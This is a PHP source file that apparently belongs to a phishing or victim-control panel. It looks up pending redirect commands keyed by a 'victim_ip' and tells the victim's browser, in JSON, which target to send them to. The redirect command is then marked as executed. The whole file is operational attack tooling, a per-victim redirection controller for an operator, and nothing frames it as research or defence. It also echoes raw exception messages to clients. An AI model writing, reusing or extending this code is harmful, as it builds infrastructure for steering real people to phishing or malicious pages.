<?php
session_start();
require_once __DIR__ . '/admin/auth.php';
require_once __DIR__ . '/blocker-raw.php';

// Initialize database
$database = new Database();
$db = $database->getConnection();

// Get victim IP from query parameter or REMOTE_ADDR
$victim_ip = $_GET['ip'] ?? $_SERVER['REMOTE_ADDR'];

header('Content-Type: application/json');

try {
    // Check for active redirect commands for this IP
    $query = "SELECT target FROM redirect_commands 
              WHERE victim_ip = :victim_ip 
              AND command = 'redirect' 
              AND expires_at > NOW() 
              AND executed = FALSE 
              ORDER BY created_at DESC 
              LIMIT 1";
    
    $stmt = $db->prepare($query);
    $stmt->execute([':victim_ip' => $victim_ip]);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($result) {
        // Mark command as executed
        $update_query = "UPDATE redirect_commands SET executed = TRUE WHERE victim_ip = :victim_ip AND executed = FALSE";
        $update_stmt = $db->prepare($update_query);
        $update_stmt->execute([':victim_ip' => $victim_ip]);
        
        echo json_encode([
            'redirect' => true,
            'target' => $result['target']
        ]);
    } else {
        echo json_encode([
            'redirect' => false
        ]);
    }
    
} catch (Exception $e) {
    error_log("Redirect check error: " . $e->getMessage());
    echo json_encode([
        'redirect' => false,
        'error' => $e->getMessage()
    ]);
}
?>
